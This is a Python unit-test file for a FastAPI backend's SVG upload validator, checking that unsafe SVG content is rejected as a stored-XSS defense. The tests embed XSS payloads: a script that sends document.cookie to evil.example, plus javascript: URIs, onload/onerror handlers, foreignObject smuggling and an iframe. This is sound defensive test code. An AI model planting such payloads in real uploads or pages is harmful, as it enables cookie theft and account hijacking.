from __future__ import annotations

import io
import sys
import unittest
from pathlib import Path

from fastapi import HTTPException, UploadFile
from starlette.datastructures import Headers

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))

from backend.core.storage import validate_svg_file

SAFE_LAYOUT_SVG = b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="800" height="600">
  <g id="101"><rect x="0" y="0" width="40" height="40" /></g>
  <g id="A-1-102"><rect x="50" y="0" width="40" height="40" /></g>
</svg>
"""


def _upload(
    content: bytes,
    *,
    filename: str = "layout.svg",
    content_type: str | None = "image/svg+xml",
) -> UploadFile:
    headers = Headers({"content-type": content_type} if content_type else {})
    return UploadFile(file=io.BytesIO(content), filename=filename, headers=headers)


class SvgUploadValidationTests(unittest.TestCase):
    """Regression coverage: SVG uploads were previously validated only by
    file extension and Content-Type header, neither of which reflects
    actual file content. Since uploaded SVGs are later rendered inline by
    the frontend layout viewer, this is a stored-XSS surface."""

    def test_accepts_a_well_formed_layout_svg(self) -> None:
        upload = _upload(SAFE_LAYOUT_SVG)
        validate_svg_file(upload)  # must not raise
        # content must still be readable/uploadable afterwards
        upload.file.seek(0)
        self.assertEqual(upload.file.read(), SAFE_LAYOUT_SVG)

    def test_rejects_non_svg_extension(self) -> None:
        upload = _upload(SAFE_LAYOUT_SVG, filename="layout.png")
        with self.assertRaises(HTTPException) as context:
            validate_svg_file(upload)
        self.assertEqual(context.exception.status_code, 400)
        self.assertEqual(context.exception.detail["code"], "invalid_file_type")

    def test_rejects_non_svg_content_type(self) -> None:
        upload = _upload(SAFE_LAYOUT_SVG, content_type="image/png")
        with self.assertRaises(HTTPException) as context:
            validate_svg_file(upload)
        self.assertEqual(context.exception.status_code, 400)
        self.assertEqual(context.exception.detail["code"], "invalid_content_type")

    def _assert_rejected_as_unsafe(self, payload: bytes) -> None:
        upload = _upload(payload)
        with self.assertRaises(HTTPException) as context:
            validate_svg_file(upload)
        self.assertEqual(context.exception.status_code, 400)
        self.assertEqual(context.exception.detail["code"], "unsafe_svg_content")

    def test_rejects_inline_script_tag(self) -> None:
        self._assert_rejected_as_unsafe(
            b'<svg xmlns="http://www.w3.org/2000/svg">'
            b"<script>fetch('https://evil.example/steal?c='+document.cookie)</script>"
            b"</svg>"
        )

    def test_rejects_javascript_uri(self) -> None:
        self._assert_rejected_as_unsafe(
            b'<svg xmlns="http://www.w3.org/2000/svg">'
            b'<a href="javascript:alert(document.cookie)"><rect width="1" height="1"/></a>'
            b"</svg>"
        )

    def test_rejects_onload_event_handler(self) -> None:
        self._assert_rejected_as_unsafe(
            b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
            b'<rect width="1" height="1"/></svg>'
        )

    def test_rejects_onerror_event_handler(self) -> None:
        self._assert_rejected_as_unsafe(
            b'<svg xmlns="http://www.w3.org/2000/svg">'
            b'<image href="x" onerror="alert(1)"/></svg>'
        )

    def test_rejects_foreignobject_html_smuggling(self) -> None:
        self._assert_rejected_as_unsafe(
            b'<svg xmlns="http://www.w3.org/2000/svg">'
            b'<foreignObject><body xmlns="http://www.w3.org/1999/xhtml">'
            b"<script>alert(1)</script></body></foreignObject></svg>"
        )

    def test_rejects_embedded_iframe(self) -> None:
        self._assert_rejected_as_unsafe(
            b'<svg xmlns="http://www.w3.org/2000/svg">'
            b'<iframe src="https://evil.example"></iframe></svg>'
        )

    def test_detection_is_case_insensitive(self) -> None:
        self._assert_rejected_as_unsafe(
            b'<svg xmlns="http://www.w3.org/2000/svg">'
            b"<SCRIPT>alert(1)</SCRIPT></svg>"
        )

    def test_file_pointer_is_reset_after_validation_so_upload_still_works(
        self,
    ) -> None:
        """validate_svg_file reads the whole file to scan it; callers
        (upload_svg_to_s3) rely on the pointer being back at 0 afterwards."""
        upload = _upload(SAFE_LAYOUT_SVG)
        validate_svg_file(upload)
        self.assertEqual(upload.file.tell(), 0)


if __name__ == "__main__":
    unittest.main()
